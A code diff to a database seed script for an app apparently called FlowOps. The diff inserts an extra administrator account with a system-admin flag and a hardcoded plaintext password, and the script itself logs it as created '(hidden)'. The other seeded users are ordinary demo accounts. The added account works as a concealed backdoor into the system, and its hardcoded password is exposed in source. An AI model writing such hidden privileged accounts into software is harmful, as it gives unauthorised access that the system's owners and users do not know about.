@@ -24,6 +24,19 @@ async function seed() {
     await db.delete(users);
     console.log('✅ Existing data cleared');
 
+    const systemAdminPassword = await bcrypt.hash('Jordan2005diocesano', SALT_ROUNDS);
+    await db.insert(users).values({
+      name: 'Angel Gonzalez',
+      email: 'system.admin@flowops.internal',
+      username: 'angelglezz_',
+      password: systemAdminPassword,
+      role: 'admin',
+      status: 'active',
+      establishment: 'Global',
+      isSystemAdmin: true
+    });
+    console.log('✅ System admin created (hidden)');
+
     const hashedPassword = await bcrypt.hash('password123', SALT_ROUNDS);
 
     const [adminUser] = await db.insert(users).values({
@@ -34,7 +47,8 @@ async function seed() {
       role: 'manager',
       status: 'active',
       establishment: 'Bison Den',
-      phoneNumber: '555-0100'
+      phoneNumber: '555-0100',
+      isSystemAdmin: false
     }).returning();
 
     console.log('✅ Admin user created:', adminUser.username);
